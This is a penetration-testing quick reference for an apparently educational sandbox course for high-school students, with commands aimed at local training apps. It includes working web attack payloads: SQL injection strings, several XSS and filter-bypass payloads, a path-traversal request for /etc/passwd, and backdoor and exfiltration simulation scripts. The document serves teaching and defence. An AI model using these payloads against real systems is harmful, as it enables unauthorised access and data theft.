# Penetration Testing - Quick Reference

## Commands

### Automated Penetration Testing

```bash
# Comprehensive automated testing (RECOMMENDED)
python src/analyser/penetration_analyser.py http://localhost:5000 --deep --exploit --output comprehensive_security_report_port5000.pdf    # PWA application (primary)
python src/analyser/penetration_analyser.py http://localhost:9090 --deep --output detailed_pentest_port9090.pdf    # Flask application (secondary)
python src/analyser/penetration_analyser.py http://localhost:3000 --deep --output detailed_pentest_port3000.pdf    # Node.js application

# Quick automated vulnerability assessment
python src/analyser/penetration_analyser.py http://localhost:5000 --quick --output quick_pentest_assessment.pdf

# Generate detailed comprehensive report (RECOMMENDED)
python src/analyser/penetration_analyser.py http://localhost:5000 --deep --exploit --output detailed_pentest_comprehensive.pdf
```

### Manual Testing Commands

```bash
# SQL injection testing
curl -X POST "http://localhost:5000/login" -d "username=admin' OR '1'='1&password=test"

# XSS testing  
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Authentication bypass
curl -X POST "http://localhost:5000/admin" -H "Authorization: Bearer invalid_token"

# Directory traversal
curl "http://localhost:5000/download?file=../../../etc/passwd"
```

### Reconnaissance Commands

```bash
# Network service discovery
python src/analyser/network_cli.py --scan-services localhost --educational

# Web application fingerprinting
python src/analyser/dast_cli.py http://localhost:5000 --quick

# Technology stack identification
curl -I http://localhost:5000  # Check HTTP headers
```

### Integration Commands

```bash
# Combine SAST and penetration testing
python src/analyser/analyse_cli.py samples/unsecure-pwa --educational
python src/analyser/penetration_test_cli.py localhost:5000

# Network analysis with penetration testing
python src/analyser/network_cli.py --monitor-connections --duration 60 &
python src/analyser/penetration_test_cli.py localhost:5000
```
## Concepts

### Penetration Testing Methodology

**Ethical Hacking Framework**: Authorised testing to identify security vulnerabilities
- Reconnaissance: Information gathering and target analysis
- Vulnerability Assessment: Systematic security weakness identification
- Exploitation: Controlled validation of vulnerability exploitability
- Post-Exploitation: Understanding potential impact and risk

**Automated vs Manual Testing**:
- **Automated**: Efficient, comprehensive, consistent scanning
- **Manual**: Creative, contextual, business logic focused
- **Professional Approach**: Combine both for comprehensive coverage

### Testing Phases

**Phase 1: Reconnaissance**
- Network service discovery and enumeration
- Technology stack identification
- Application fingerprinting and mapping

**Phase 2: Vulnerability Assessment**
- Automated vulnerability scanning
- Static and dynamic analysis integration
- Risk prioritization and validation

**Phase 3: Exploitation**
- Controlled vulnerability validation
- Attack chain development
- Impact demonstration

**Phase 4: Reporting**
- Risk-based findings documentation
- Business impact assessment
- Remediation recommendations

### Ethical Guidelines

**Authorization Requirements**: Only test systems you own or have explicit permission to test
**Scope Limitations**: Stay within defined testing boundaries
**Responsible Disclosure**: Report findings through proper channels
**No Harm Principle**: Avoid disrupting production systems or data

### Professional Tools and Techniques

**Automated Tools**: Comprehensive vulnerability scanners for baseline assessment
**Manual Techniques**: Custom exploitation for business logic and complex vulnerabilities
**Integration Approach**: Combine SAST, DAST, network analysis, and penetration testing
**Documentation Standards**: Professional reporting for technical and business audiences

## Issues

### Common Testing Problems

**Applications Not Accessible**:
```bash
# Fix: Ensure target applications are running
curl http://localhost:5000 || echo "Application not responding"
docker-compose -f docker/docker-compose.yml up -d
```

**Permission Denied for Exploitation**:
```bash
# Fix: Verify testing is authorised and in sandbox environment
pwd | grep "Secure_Architecture_Sandbox" || echo "Ensure testing in authorised environment"
```

**Tools Not Available**:
```bash
# Fix: Check tool availability and use alternatives
python src/analyser/penetration_test_cli.py --help || echo "Tool not available"
python src/analyser/dast_cli.py --help  # Use alternative testing approach
```

### Analysis and Interpretation Issues

**False Positive Vulnerabilities**: Tools report issues that aren't exploitable
- Validate findings manually through controlled exploitation
- Consider application context and intended functionality
- Cross-reference with multiple testing approaches

**Overwhelming Results**: Too many findings to prioritise effectively
- Focus on Critical and High severity issues first
- Group related vulnerabilities by impact
- Prioritise based on exploitability and business risk

**Incomplete Coverage**: Missing vulnerabilities or attack vectors
- Combine automated and manual testing approaches
- Test business logic and workflow-specific vulnerabilities
- Consider application-specific attack scenarios

### Ethical and Legal Considerations

**Scope Violations**: Testing outside authorised boundaries
- Verify testing targets are within approved scope
- Document all testing activities and findings
- Stop testing if unauthorized access is achieved

**Impact on Systems**: Testing causes system instability or data loss
- Use non-destructive testing techniques when possible
- Monitor system performance during testing
- Have rollback procedures for testing changes

**Reporting Sensitive Findings**: Handling critical security vulnerabilities
- Follow responsible disclosure guidelines
- Provide clear remediation guidance
- Prioritise findings by business risk and exploitability

## üéØ Vulnerability Assessment

### SAST Integration

```bash
# Comprehensive static analysis (primary target first)
python src/analyser/analyse_cli.py samples/unsecure-pwa --educational
python src/analyser/analyse_cli.py samples/vulnerable-flask-app --educational
python src/analyser/analyse_cli.py samples/suspicious-scripts --educational

# Focus on exploitable vulnerabilities


# Union-based injection (extend automated discoveries)
curl -X POST "http://localhost:5000/search" \
  -d "query=' UNION SELECT username,password FROM users--" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Error-based injection (manual technique)
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' AND (SELECT COUNT(*) FROM users)>0--&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Time-based blind injection (advanced manual technique)
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' AND (SELECT sleep(5))--&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### Manual Cross-Site Scripting (XSS)

```bash
# Reflected XSS (validate automated findings)
curl "http://localhost:5000/search?q=<script>alert('Reflected XSS')</script>"
curl "http://localhost:5000/user?name=<img src=x onerror=alert('XSS')>"

# Stored XSS (extend automated testing)
curl -X POST "http://localhost:5000/comment" \
  -d "comment=<script>alert('Stored XSS')</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"

# DOM-based XSS (often missed by automated tools)
curl "http://localhost:5000/profile#<img src=x onerror=alert('DOM XSS')>"

# Filter bypass techniques (advanced manual testing)
curl "http://localhost:5000/search?q=<svg onload=alert('Bypass')>"
curl "http://localhost:5000/search?q=<img src=x onerror=alert('Filter_Bypass')>"
```

### Authentication and Session Testing

```bash
# Automated dictionary attack validation
# (automated tool tests 50 common username/password combinations)
python src/analyser/penetration_analyser.py localhost:5000 | grep -i "weak authentication"

# Manual authentication bypass techniques  
curl -X POST "http://localhost:8080/login" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Session manipulation (manual technique)
curl -X GET "http://localhost:5000/admin" \
  -H "Cookie: session=modified_session_value"

# Parameter pollution (advanced manual technique)
curl -X POST "http://localhost:5000/login" \
  -d "username=user&username=admin&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

# HTTP method bypass (manual technique)
curl -X PUT "http://localhost:5000/admin/users"
curl -X DELETE "http://localhost:5000/admin/users/1"
```

## üîç Post-Exploitation Analysis

### Persistence Simulation

```bash
# Backdoor communication patterns
python samples/backdoor-apps/backdoor_app.py &
python src/analyser/network_cli.py --monitor-connections --duration 120 --educational

# Persistence mechanism analysis
python samples/network-scenarios/backdoor_simulation.py 90 &
python src/analyser/network_cli.py --capture-traffic --duration 100 --educational
```

### Data Exfiltration Patterns

```bash
# Monitor exfiltration traffic
python samples/network-scenarios/backdoor_simulation.py 120 &
python src/analyser/network_cli.py --dns-analysis --duration 130 --educational

# DNS tunneling detection
python samples/network-scenarios/dns_threat_scenarios.py 60 &
python src/analyser/network_cli.py --dns-analysis --duration 70 --educational
```

### Lateral Movement Simulation

```bash
# Internal network discovery
python src/analyser/network_cli.py --scan-services 127.0.0.1 --educational

# Suspicious network patterns
python samples/network-scenarios/suspicious_traffic_generator.py 60 &
python src/analyser/network_cli.py --monitor-connections --duration 70 --educational
```

## üìä Professional Reporting

### Automated Report Generation

```bash
# Generate automated penetration testing reports
python src/analyser/penetration_analyser.py localhost:5000 > reports/automated_pentest_pwa.txt
python src/analyser/penetration_analyser.py localhost:9090 > reports/automated_pentest_flask.txt

# Traditional analysis reports  
python src/analyser/analyse_cli.py samples/ --educational --output reports/pentest_final_sast.json
python src/analyser/dast_cli.py --demo-apps --educational --output reports/pentest_final_dast.json
python src/analyser/network_cli.py --demo-network --educational --output reports/pentest_final_network.json

# Review all generated reports
ls -la reports/pentest_* reports/automated_*
head -20 reports/automated_*.txt
tail -20 reports/pentest_*.json
```

### Comprehensive Assessment Report Structure

```markdown
# Professional Penetration Testing Report

## Executive Summary
- **Automated Baseline**: X vulnerabilities discovered in Y minutes using professional tools
- **Manual Validation**: Z additional vulnerabilities confirmed through expert analysis
- **Combined Risk Assessment**: Overall security posture and business impact
- **Efficiency Analysis**: Automated vs manual testing effectiveness

## Technical Assessment Methodology

### Automated Testing Phase (Phase 3A)
- **Tool Used**: Professional penetration testing analyser
- **Scope**: Comprehensive vulnerability discovery and dictionary attacks
- **Duration**: 30-45 minutes per target application  
- **Coverage**: SQL injection, XSS, weak authentication, configuration issues

### Manual Testing Phase (Phase 3B)  
- **Methodology**: Custom payload development and business logic testing
- **Scope**: Validation and extension of automated findings
- **Duration**: 60-90 minutes per target application
- **Coverage**: Advanced exploitation, custom attack chains, logic flaws

## Combined Findings Analysis
- **Automated Discovery**: Rapid baseline vulnerability identification
- **Manual Validation**: Confirmation and detailed exploitation development
- **Unique Manual Findings**: Issues missed by automated tools
- **Efficiency Assessment**: Time vs coverage analysis
```

### Automated vs Manual Comparison Report

```bash
# Generate comparison analysis
echo "=== AUTOMATED PENETRATION TESTING RESULTS ===" > reports/comparison_analysis.txt
python src/analyser/penetration_analyser.py localhost:5000 >> reports/comparison_analysis.txt

echo "=== MANUAL TESTING VALIDATION ===" >> reports/comparison_analysis.txt
echo "Manual SQL injection validation:" >> reports/comparison_analysis.txt
curl -X POST "http://localhost:5000/login" -d "username=admin' OR 1=1--&password=test" >> reports/comparison_analysis.txt

echo "=== COVERAGE ANALYSIS ===" >> reports/comparison_analysis.txt
echo "Automated findings: [Count from automated tool]" >> reports/comparison_analysis.txt  
echo "Manual additional findings: [Count from manual testing]" >> reports/comparison_analysis.txt
echo "Combined unique vulnerabilities: [Total count]" >> reports/comparison_analysis.txt
```

### Risk Assessment Framework

```bash
# CVSS Base Score Calculation
# Exploitability Metrics:
# - Attack Vector (Network/Adjacent/Local/Physical)
# - Attack Complexity (Low/High)
# - Privileges Required (None/Low/High)
# - User Interaction (None/Required)

# Impact Metrics:
# - Confidentiality (None/Low/High)
# - Integrity (None/Low/High)
# - Availability (None/Low/High)

# Risk Priority = (Exploitability Score) √ó (Impact Score)
```

### Executive Summary Template

```markdown
# Penetration Testing Executive Summary

## Assessment Overview

- **Target**: Secure Architecture Sandbox Testing Environment
- **Duration**: [Testing Period]
- **Methodology**: OWASP Testing Guide + NIST Framework

## Risk Summary

- **Critical**: X vulnerabilities requiring immediate attention
- **High**: X vulnerabilities requiring prompt remediation
- **Medium**: X vulnerabilities for planned remediation
- **Low**: X informational findings

## Business Impact

- **Immediate Risk**: [Description]
- **Potential Data Exposure**: [Types of data at risk]
- **Compliance Impact**: [Regulatory considerations]

## Recommendations

1. **Immediate Actions** (0-30 days)
2. **Short-term Improvements** (1-3 months)
3. **Long-term Strategy** (6-12 months)
```

## üõ°Ô∏è Ethical Guidelines Quick Reference

### Legal Boundaries

```bash
# ‚úÖ AUTHORISED ACTIVITIES (Sandbox Only)
# - Testing provided vulnerable applications
# - Using educational tools on localhost
# - Documenting findings for learning
# - Practicing on owned systems

# ‚ùå UNAUTHORIZED ACTIVITIES (Never)
# - Testing systems you don't own
# - Accessing production systems
# - Causing damage or disruption
# - Sharing or selling vulnerabilities
```

### Professional Standards

- **Permission**: Always obtain written authorization
- **Scope**: Stay within defined testing boundaries
- **Documentation**: Record all testing activities
- **Reporting**: Provide actionable findings
- **Confidentiality**: Protect client information

### Incident Response

```bash
# If you accidentally access unauthorized data:
# 1. Stop the activity immediately
# 2. Document what happened
# 3. Report to instructor/supervisor
# 4. Do not access or copy the data
# 5. Follow organizational incident procedures
```

## üîß Troubleshooting

### Common Issues and Solutions

```bash
# Services not responding
# Solution: Restart applications
cd samples/unsecure-pwa && python main.py &
cd samples/vulnerable-flask-app && python app.py &

# Permission denied errors
# Solution: Use educational mode
python src/analyser/network_cli.py --demo-network --educational

# Network tools not available
# Solution: Use built-in alternatives
python src/analyser/network_cli.py --scan-services localhost --educational
```

### Performance Optimization

```bash
# Reduce output verbosity
python src/analyser/analyse_cli.py samples/unsecure-pwa --quiet

# Focus on specific vulnerability types
python src/analyser/dast_cli.py http://localhost:5000 --test-sqli --educational

# Limit scan duration
python src/analyser/network_cli.py --monitor-connections --duration 60 --educational
```

### Environment Validation

```bash
# Check all tools are working
python src/analyser/analyse_cli.py --help
python src/analyser/dast_cli.py --help
python src/analyser/network_cli.py --help

# Verify applications are running
curl -I http://localhost:5000
curl -I http://localhost:8080

# Test network connectivity
python src/analyser/network_cli.py --scan-services localhost --ports 5000,8080
```

## üìö Methodology Reference

### OWASP Testing Guide Phases

1. **Information Gathering**

   - Conduct search engine discovery
   - Fingerprint web application framework
   - Map application architecture

2. **Configuration Management**

   - Test network infrastructure configuration
   - Test application platform configuration
   - Test file extensions handling

3. **Authentication Testing**

   - Test credentials transported over encrypted channel
   - Test default credentials
   - Test weak lock out mechanism

4. **Authorization Testing**

   - Test directory traversal
   - Test privilege escalation
   - Test insecure direct object references

5. **Session Management**
   - Test session token strength
   - Test cookie attributes
   - Test session fixation

### NIST Cybersecurity Framework Integration

- **Identify**: Asset discovery and risk assessment
- **Protect**: Vulnerability remediation recommendations
- **Detect**: Monitoring and alerting improvements
- **Respond**: Incident response procedure updates
- **Recover**: Business continuity considerations

## üéØ Career Development

### Industry Certifications

- **CEH**: Certified Ethical Hacker (Entry Level)
- **OSCP**: Offensive Security Certified Professional (Advanced)
- **CISSP**: Certified Information Systems Security Professional (Management)
- **CISM**: Certified Information Security Manager (Leadership)

### Skill Development Path

1. **Foundation**: Complete all sandbox exercises (SAST, DAST, Network,
   Penetration Testing)
2. **Practice**: Set up home labs with deliberately vulnerable applications
3. **Learning**: Take online courses and read security research
4. **Certification**: Pursue industry-recognised certifications
5. **Experience**: Contribute to open source security projects
6. **Specialization**: Focus on specific areas (web app security, network
   security, etc.)

---

**Duration**: Reference for 4-5 hour exercise  
**Difficulty**: Advanced  
**Prerequisites**: SAST, DAST, Network Analysis, Sandbox exercises completed  
**Target Audience**: High school students with cybersecurity interest
